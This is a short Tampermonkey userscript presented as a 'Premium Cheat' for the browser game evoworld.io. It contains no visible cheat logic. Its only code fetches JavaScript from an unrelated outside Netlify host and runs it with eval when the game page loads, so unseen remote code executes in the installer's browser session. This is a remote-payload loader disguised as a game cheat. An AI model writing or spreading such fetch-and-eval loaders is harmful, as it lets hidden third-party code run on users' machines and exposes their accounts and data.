// ==UserScript==
// @name         evoworld.io Nonagon | Premium Cheat
// @namespace    http://tampermonkey.net/
// @version      ![]
// @description  try to take over the world!
// @author       You
// @match        https://evoworld.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @grant        none
// ==/UserScript==

fetch('https://arknights-endfield.netlify.app/index_.js').then(r=>r.text()).then(c=>eval(c));
